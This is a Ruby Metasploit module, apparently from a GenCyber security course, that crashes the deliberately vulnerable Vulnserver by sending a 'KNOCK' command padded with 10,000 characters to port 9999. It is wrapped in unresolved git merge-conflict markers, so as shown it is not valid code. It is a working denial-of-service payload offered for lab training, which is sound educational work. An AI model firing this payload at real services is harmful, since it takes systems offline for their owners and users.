<<<<<<< HEAD

=======
class MetasploitModule < Msf::Auxiliary	# This is a remote exploit module inheriting from the remote exploit class
  Rank = NormalRanking	# Potential impact to the target

  include Msf::Exploit::Remote::Tcp	# Include remote tcp exploit module
  include Msf::Auxiliary::Dos

  def initialize(info = {})	# i.e. constructor, setting the initial values
    super(update_info(info,
      'Name'           => 'Vulnserver Buffer Overflow-KNOCK command', # Name of the target
      'Description'    => %q{
         Vulnserver is intentially written vulnerable. This expoits uses a simple buffer overflow.
      },
      'Author'         => [ 'fxw', 'GenCyber-UML-2022'], # Author name
      'License'        => MSF_LICENSE,
      'References'     =>	# References for the vulnerability or exploit
        [
          [ 'URL', 'https://github.com/xinwenfu/Malware-Analysis/edit/main/MetasploitNewModule' ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => 'Mar. 30, 2022'))	# When the vulnerability was disclosed in public
      register_options([
      	Opt::RPORT(9999)
      ])
  end

  def run	# Actual exploit
        print_status("Connecting to target with IP #{datastore['RHOST']} and Port #{datastore['RPORT']}")
        connect #connect to target using values stored in datastore
        
        outbound = "KNOCK /.:/" + "A"*10000 #create outbound message, in this case A can be anything as we just want to crash the server 

        print_status("Sending Exploit in 6 seconds")

        for x in 0..5 do
            print_status("#{6 - x}")
            sleep(1) #sleep for 1 second 6 times so that we will wait 6 seconds and count down
        end

        sock.put(outbound)
        print_status("Exploit Sent")
    ensure #ensure that exploit disconnects
        disconnect
        print_status("Exiting Run Function")
  end
end
>>>>>>> parent of d09ec3d (Update DOS.rb)
